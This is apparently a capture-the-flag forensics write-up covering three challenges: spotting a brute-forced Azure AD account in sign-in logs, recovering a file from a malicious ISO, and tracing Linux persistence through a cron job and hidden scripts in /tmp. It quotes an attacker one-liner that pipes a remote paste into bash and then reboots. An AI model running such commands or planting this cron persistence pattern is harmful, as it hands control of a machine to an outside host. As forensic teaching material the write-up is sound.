Tenant Trouble - easy :
#

Challenge statement : üìùIt seems that a user account has been compromised, could you identify the account in question and the start of the attack?

For this challenge we have a csv file with logs. It seems to be logs of connection to the Azure AD service. When we quickly analyse the csv it comes to bump that a user often returns, this user is mister.bennet .

Using a linux command I will count the number of failed connection for this user.

cat winchester77_signin_logs_2024.csv | grep "mister.bennet@winchester77.onmicrosoft.com" | grep "UserLoginFailed"| wc 
    364    1092   74359

it would seem that we have to do an attack by brute force or password spraying targeted on this user because the other users does not have as much failed connection (while other users like lydia.bennet and elizabeth.bennet were also targeted with notable failures (24 and 20 attempts, respectively).)

Now that we have found the targeted user let‚Äôs try to find out when the attack started.

> cat winchester77_signin_logs_2024.csv | grep "mister.bennet@winchester77.onmicrosoft.com" | grep -C2 "UserLoginFailed"

I find that the user mister.bennet had a fairly normal connection in terms of until timestamp 2024-05-02T11:05:37Z because after this, the failed logins begins to be frequent signifying that I have a beginning attack on this user account.

For the flag I take the timestanp of the first failed connection from the moment when the connections fail become frequent.

Hero{2024-05-02;mister.bennet@winchester77.onmicrosoft.com}

Challenge statement : üìùA suspicious file has been found on one of your employee’s workstations. He apparently retrieved the .iso file from an e-mail attachment… Find the file contained in the iso, identify the file type and calculate its sha256 fingerprint.

For this challenge we retrieve an archive in which is contained a file .iso, which would have served to compromise a workstation. the files are often used by attackers to indirectly deliver the payload , the challenge asks us to recover the bad file contained in the iso.

#

Challenge statement : üìùYou have identified the malicious load, it seems, that a script was executed before the computer turns off, you made a copy of the disk and you start investigating to understand the “extent of the damage”

This challenge is related to the chall LazySysAdmin #1 in the MISC category. In this first chall, the end is to discover that a user has made and executed the following command on his post.

curl -s https://ghostbin.site/6y65l/raw | bash && sleep 2 && reboot -f

We are given a copy of the disk to investigate and find where is install the attacker. To start the investigation we can mount the image.

> mkdir HERO
> mount -o loop server-SX03.iso HERO
> cd HERO

We will look for signs of compromise, including persistence. When we talk about Linux persistance I think first to the Linux service, to go look if there is something not normal you have to look in /etc/systemd/system and check the .service file is not regular or modified .

But I can‚Äôt find anything that tells me the PC was compromised.

Malicious scripts often use crontabs to establish persistence. I will investigate the crontab. For this I use a cheat-sheet found on hacktricks.

Linux Forensics | HackTricks

The cron runs continuously and runs a bash script located in /tmp let‚Äôs take a look at /tmp.

Content of .wrapper_script.sh.

> cat .wrapper_script.sh
#!/bin/bash

while true; do
  # Your main script code here
  /tmp/.script.sh

  # Wait for 15 seconds before running again
  sleep 15
done

Content of .script.sh

> cat .script.sh 
#!/bin/bash

RANDOM_NUMBER=$(shuf -i 1-13 -n 1)

.wrapper_script.sh runs the .script.sh script in a loop every 15 seconds. .script.sh retrieves content from Pastebin, chooses a random line, decodes it to base64, and then displays the decoded text as a message on the user‚Äôs desktop (with wall).
